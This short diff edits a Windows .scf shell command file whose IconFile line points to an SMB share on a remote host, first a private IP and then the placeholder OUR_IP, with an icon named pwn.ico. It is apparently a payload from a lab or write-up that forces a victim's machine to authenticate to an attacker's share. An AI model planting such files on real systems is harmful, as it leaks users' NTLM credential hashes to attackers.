@@ -50,6 +50,6 @@
 
 #### [Shell]
 #### Command=2
-#### IconFile=\\10.10.14.3\share\pwn.ico
+#### IconFile=\\OUR_IP\share\pwn.ico
 #### [Taskbar]
 #### Command=ToggleDesktop
